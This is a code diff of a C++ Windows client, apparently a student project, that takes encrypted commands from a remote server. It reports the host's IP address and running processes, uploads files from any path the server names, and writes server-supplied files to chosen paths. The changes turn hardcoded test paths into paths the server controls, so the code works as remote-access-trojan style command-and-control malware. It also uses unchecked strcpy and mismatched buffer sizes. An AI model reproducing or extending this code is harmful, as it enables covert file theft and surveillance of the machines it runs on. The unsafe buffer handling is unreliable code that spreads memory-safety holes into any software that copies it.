@@ -165,7 +165,9 @@ void upload(SOCKET clientSocket, const char* filePath)
     ifstream file(filePath);
     if (!file.is_open())
     {
-        cerr << "Failed to open file: test.txt" << endl;
+        cerr << "Failed to open file: " << filePath << endl;
+        string encryptedContents = encrypt("Failed to open file");
+        int bytesSent = send(clientSocket, encryptedContents.c_str(), encryptedContents.length(), 0);
         return;
     }
 
@@ -194,14 +196,7 @@ void download(SOCKET clientSocket, const char* filePath, char contents[120])
         cerr << "Failed to open output file: " << strerror_s(errorMsg, sizeof(errorMsg), errno) << endl;
         return;
     }
-
-    // Receive the file contents from the server
-    const int bufferSize = 1024;
-    char buffer[bufferSize];
-    int bytesReceived = 0;
     
-    cout << "\nreceived from server: " << contents <<endl;
-    printf("\n received from server2: %s\n", contents);
     if (strlen(contents) > 0)
     {
         outFile.write(contents, strlen(contents));
@@ -362,6 +357,7 @@ void sendRunningProcesses(SOCKET clientSocket) {
         WideCharToMultiByte(CP_UTF8, 0, processEntry.szExeFile, -1, exeName, MAX_PATH, NULL, NULL);
         processList.append(exeName);
         processList.append("\n");
+        
     } while (Process32Next(snapshot, &processEntry));
 
     CloseHandle(snapshot);
@@ -442,16 +438,17 @@ int main(int argc, char* arg[]) {
         //Receive command from server    
         int byteCount = recv(clientSocket, buffer, 200, 0);
         
-        //Convert buffer to a readable string to compare inside the if statements
-        //string str(buffer); // buffer is already a char array - will otherwise be encoded incorrectly
-        printf("\nencrypted received command: %s\n", buffer);
-        
-        string decryptedBuff = decrypt(string(buffer));
-        strncpy(buffer, decryptedBuff.c_str(), decryptedBuff.size());
-        buffer[decryptedBuff.size()] = '\0';
-        printf("\nreceived command: %s\n", buffer);
 
         if (byteCount > 0) {
+            //Convert buffer to a readable string to compare inside the if statements
+            //string str(buffer); // buffer is already a char array - will otherwise be encoded incorrectly
+            printf("\nencrypted received command: %s\n", buffer);
+            
+            string decryptedBuff = decrypt(string(buffer));
+            strncpy(buffer, decryptedBuff.c_str(), decryptedBuff.size());
+            buffer[decryptedBuff.size()] = '\0';
+            printf("\nreceived command: %s\n", buffer);
+
             if (strstr(buffer, "IPADDRESS")) {
                 //Send IP Address
                 string ipAddress = getIpAddress();
@@ -535,23 +532,40 @@ int main(int argc, char* arg[]) {
                 sendRunningProcesses(clientSocket);
             }
             else if (strstr(buffer, "UPLOAD")) {
-                
-                //Need to change this to the server entered file path but this should be fine for testing purposes
-                upload(clientSocket, "C:\\Users\\student\\Desktop\\test.txt"); 
+                char* tokenA = strtok(buffer, " ");
+                tokenA = strtok(NULL, " "); // upload from path
+                char path[100];
+                strcpy(path, tokenA);
+                //path[strlen(path)-1] = '\0';
+                cout << "filename uploading from: " << path << endl;
+                upload(clientSocket, path);
+                //upload(clientSocket, "C:\\Users\\student\\Desktop\\test.txt"); 
             }
             else if (strstr(buffer, "DOWNLOAD")) {
-                char* token = strtok(buffer, "\n");
+                char before[512];
+                strncpy(before, buffer, sizeof(buffer));
+                char* token = strtok(before, "\n");
                 token = strtok(NULL, "\n");
-                char contents[120];
+                char contents[1024];
                 strcpy(contents, token);
-                contents[strlen(contents)-1] = '\0';
-                //Need to change this to the server entered file path but this should be fine for testing purposes
-                download(clientSocket, "C:\\Users\\student\\Desktop\\client_downloaded.txt", contents);
+                char* tokenA = strtok(before, " ");
+                tokenA = strtok(NULL, " "); // download from path
+                tokenA = strtok(NULL, " "); // download to path
+                char path[100];
+                strcpy(path, tokenA);
+                // contents[strlen(contents)-1] = '\0';
+                
+                cout << " file download to: " << path << endl;
+                cout << " file contents: " << contents << endl;
+                // path[strlen(path)-1] = '\0';
+                download(clientSocket, path, contents);
+                // download(clientSocket, "C:\\Users\\student\\Desktop\\client_downloaded.txt", contents);
             }
             else if (strstr(buffer, "EXIT")) {
                 WSACleanup();
                 return 0;
             }
+            byteCount = 0;
         }
         else {
             WSACleanup();
